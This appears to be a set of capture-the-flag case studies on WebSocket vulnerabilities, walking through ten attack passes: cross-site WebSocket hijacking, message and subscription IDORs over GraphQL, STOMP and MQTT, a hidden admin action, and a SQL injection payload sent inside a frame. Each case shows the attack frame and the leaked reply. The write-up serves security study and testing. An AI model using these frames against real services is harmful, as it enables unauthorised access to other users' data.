# Case studies — the worked passes

## Case 1: the chat-app CSWSH

```text
recon:    bundle -> wss://x/chat ; Socket.IO client ; 'history'/'dm'
handshake: --origin 'https://evil' -> 101 (no check)
binding:   Cookie:session -> the victim's socket
samesite:  Set-Cookie: SameSite=Lax
frame:     42["history",{"room":"dm"}] -> the victim's DMs -> the flag
verdict:   CSWSH — foreign-Origin + binding + SameSite + data
route:     web-websocket -> the victim's channel
```

## Case 2: the doc message-IDOR

```text
recon:    bundle -> wss://x/doc ; 'open'/'op'/'sync' ; doc:"<uuid>"
frame:    {"action":"open","doc":"admin-doc"} -> {"doc":"admin-doc",
          "flag":"..."}
verdict:  message-IDOR — the per-object scope check is absent
route:    web-websocket -> web-idor -> the flag
```

## Case 3: the hidden admin action

```text
recon:    bundle -> HANDLERS: ping/data/admin/debug (the UI shows 2)
frame:    {"action":"admin"} -> {"flag":"...","users":[...]}
verdict:  action-dispatch — the dispatch has no role check
route:    web-websocket -> the flag
```

## Case 4: the injection-in-frame

```text
recon:    {"action":"search","q":"x"} -> a query field
frame:    {"action":"search","q":"' UNION SELECT flag--"} ->
          {"rows":[{"flag":"..."}]}
verdict:  injection — the field reaches the query
route:    web-websocket -> web-sqli -> the flag
```

## Case 5: the token-in-URL

```text
recon:    bundle -> wss://x/ws?token=eyJ...
finding:  the JWT in the URI -> logged -> a credential-in-URL
verdict:  web-auth-session / web-info-disclosure (not a channel gap)
note:     the channel's cells are still probed separately
```

## Case 6: the unauth channel

```text
recon:    no cookie/token -> 101
frame:    {"action":"dump"} -> {"users":[{"flag":"..."}]}
verdict:  unauth channel — no credentials needed
route:    web-websocket -> the flag
```

## Case 7: the protobuf field

```text
recon:    binary frames -> proto_decode.py -> field 4 = the flag
verdict:  a binary/protobuf channel carrying the flag in a field
route:    web-websocket -> proto_decode -> the flag
```

## Case 8: the graphql-subscription-IDOR

```text
recon:    Sec-WebSocket-Protocol: graphql-transport-ws
frame:    {"type":"subscribe","payload":{"query":"subscription{
          user(id:1){secret}}"}} -> another's secret
verdict:  a subscription-IDOR — graphql-over-WS
route:    web-websocket -> web-graphql -> the flag
```

## Case 9: the STOMP queue-IDOR

```text
recon:    Sec-WebSocket-Protocol: v12.stomp
frame:    SUBSCRIBE destination:/user/admin/queue ->
          MESSAGE destination:/user/admin/queue {flag:...}
verdict:  a queue-IDOR — SUBSCRIBE to another's queue
route:    web-websocket -> web-idor -> the flag
```

## Case 10: the MQTT wildcard

```text
recon:    Sec-WebSocket-Protocol: mqtt
frame:    SUBSCRIBE {topic:"#", qos:0} -> every topic -> the flag topic
verdict:  a topic-IDOR — a wildcard subscription
route:    web-websocket -> web-idor -> the flag
```

## The pattern

Each case: recon -> the handshake cell -> the message cell -> the
verbatim cross-boundary reply -> the route. The corpus covers all the
mechanisms — the pattern is the discipline.
